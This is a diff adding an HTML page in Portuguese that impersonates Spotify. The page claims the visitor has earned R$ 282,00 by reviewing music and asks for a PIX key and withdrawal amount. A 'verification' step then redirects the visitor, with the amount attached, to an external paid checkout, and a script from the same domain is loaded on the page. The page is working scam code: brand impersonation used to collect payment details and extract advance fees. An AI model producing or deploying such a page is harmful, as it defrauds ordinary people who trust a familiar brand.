@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Spotify - Saque</title>
+  <link href="style.css" rel="stylesheet" type="text/css" />
+</head>
+
+<body>
+  <!-- Header com logo e saldo -->
+  <header class="header">
+    <div class="logo">
+      <svg width="32" height="32" viewBox="0 0 24 24" fill="#1DB954">
+        <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.859-.179-.98-.599-.122-.421.18-.861.599-.98 4.621-1.021 8.642-.6 11.762 1.32.391.18.48.659.201 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.42 1.56-.299.421-1.02.599-1.559.3z"/>
+      </svg>
+      <span>Spotify</span>
+    </div>
+    <div class="saldo">R$ 282,00</div>
+  </header>
+
+  <!-- Conteúdo principal -->
+  <main class="main-content">
+    <div class="final-card">
+      <div class="final-icon">
+        <svg width="64" height="64" viewBox="0 0 24 24" fill="#1DB954">
+          <path d="M12 0C5.4 0 0 5.4 0 12s5.4 12 12 12 12-5.4 12-12S18.66 0 12 0zm5.521 17.34c-.24.359-.66.48-1.021.24-2.82-1.74-6.36-2.101-10.561-1.141-.418.122-.859-.179-.98-.599-.122-.421.18-.861.599-.98 4.621-1.021 8.642-.6 11.762 1.32.391.18.48.659.201 1.02zm1.44-3.3c-.301.42-.841.6-1.262.3-3.239-1.98-8.159-2.58-11.939-1.38-.479.12-1.02-.12-1.14-.6-.12-.48.12-1.021.6-1.141C9.6 9.9 15 10.561 18.72 12.84c.361.181.54.78.241 1.2zm.12-3.36C15.24 8.4 8.82 8.16 5.16 9.301c-.6.179-1.2-.181-1.38-.721-.18-.601.18-1.2.72-1.381 4.26-1.26 11.28-1.02 15.721 1.621.539.3.719 1.02.42 1.56-.299.421-1.02.599-1.559.3z"/>
+        </svg>
+      </div>
+      
+      <h2>Limite de Avaliações Atingido!</h2>
+      <div class="final-message">
+        <p>Parabéns! Você completou todas as avaliações disponíveis hoje.</p>
+        <p>Seu saldo atual é de <strong>R$ 282,00</strong></p>
+        <p>Agora você pode realizar o saque do valor acumulado.</p>
+      </div>
+      <!-- Saque Section -->
+      <div class="pix-section" id="pixSection">
+        <h3>Selecione seu tipo de chave PIX</h3>
+        <p class="required-field">* Campo obrigatório</p>
+        <div class="pix-options">
+          <div class="pix-option active" data-type="cpf">
+            <div class="pix-icon">📄</div>
+            <span>CPF / CNPJ</span>
+          </div>
+          <div class="pix-option" data-type="phone">
+            <div class="pix-icon">📱</div>
+            <span>Telefone</span>
+          </div>
+          <div class="pix-option" data-type="email">
+            <div class="pix-icon">📧</div>
+            <span>E-mail</span>
+          </div>
+          <div class="pix-option" data-type="random">
+            <div class="pix-icon">🔀</div>
+            <span>Aleatória</span>
+          </div>
+        </div>
+        <div class="input-section">
+          <label for="pixKey">Chave PIX (CPF / CNPJ) *</label>
+          <input type="text" id="pixKey" placeholder="000.000.000-00" maxlength="14">
+          <small>Máximo: 000.000.000-00</small>
+        </div>
+        <div class="input-section">
+          <label for="amount">Valor do saque *</label>
+          <input type="text" id="amount" placeholder="R$ 0,00">
+        </div>
+        <button class="withdraw-btn" id="withdrawBtn">REALIZAR SAQUE</button>
+        <div class="important-info">
+          <div class="info-icon">ℹ️</div>
+          <div class="info-text">
+            <strong>Informação importante</strong><br>
+            Certifique-se de que a chave PIX está correta. O valor será enviado para a chave informada.
+          </div>
+        </div>
+      </div>
+      <!-- Verificação Section (inicialmente oculta) -->
+      <div class="verification-notice" id="verificationSection" style="display:none;">
+        <div class="verification-icon">🔒</div>
+        <h3>Verificação Necessária</h3>
+        <p>Para garantir a segurança, precisamos verificar sua identidade antes do primeiro saque.</p>
+        <p>Após a verificação, todos os saques futuros serão gratuitos.</p>
+        <div class="video-section">
+          <h4>📺 Como desbloquear seu saldo:</h4>
+          <script src="https://fast.wistia.com/player.js" async></script>
+          <script src="https://fast.wistia.com/embed/dr5rll845c.js" async type="module"></script>
+          <style>wistia-player[media-id='dr5rll845c']:not(:defined) { background: center / contain no-repeat url('https://fast.wistia.com/embed/medias/dr5rll845c/swatch'); display: block; filter: blur(5px); }</style>
+          <wistia-player media-id="dr5rll845c" aspect="1.8532818532818534" style="width: 640px;height: 345px;"></wistia-player>
+        </div>
+        <button class="withdraw-btn" id="advanceBtn">AVANÇAR PARA CHECKOUT</button>
+      </div>
+    </div>
+  </main>
+
+  <!-- Botões de ação -->
+  <footer class="action-buttons">
+    <button class="action-btn" id="homeBtn">
+      <div class="btn-icon">🏠</div>
+      <span>Início</span>
+    </button>
+    <button class="action-btn" id="duvidasBtn">
+      <div class="btn-icon">?</div>
+      <span>Dúvidas</span>
+    </button>
+  </footer>
+
+  <!-- Modal de Dúvidas -->
+  <div id="duvidasModal" class="modal">
+    <div class="modal-content">
+      <span class="close">&times;</span>
+      <h2>Dúvidas</h2>
+      <p>Em breve: suporte</p>
+    </div>
+  </div>
+
+  <script src="https://go.paradisepagbr.com/sdzc0gyyvz"></script>
+</body>
+
+<script>
+// Fluxo de saque e verificação
+  document.getElementById('withdrawBtn').addEventListener('click', function() {
+    // Esconde a seção de saque e mostra a verificação
+    document.getElementById('pixSection').style.display = 'none';
+    document.getElementById('verificationSection').style.display = 'block';
+  });
+  document.getElementById('advanceBtn').addEventListener('click', function() {
+    var amount = document.getElementById('amount').value;
+    var cleanAmount = amount.replace(/[^\d,\.]/g, '');
+    var checkoutUrl = 'https://go.paradisepagbr.com/sdzc0gyyvz?valor=' + encodeURIComponent(cleanAmount);
+    window.location.href = checkoutUrl;
+  });
+</script>
+</body>
+
+</html>
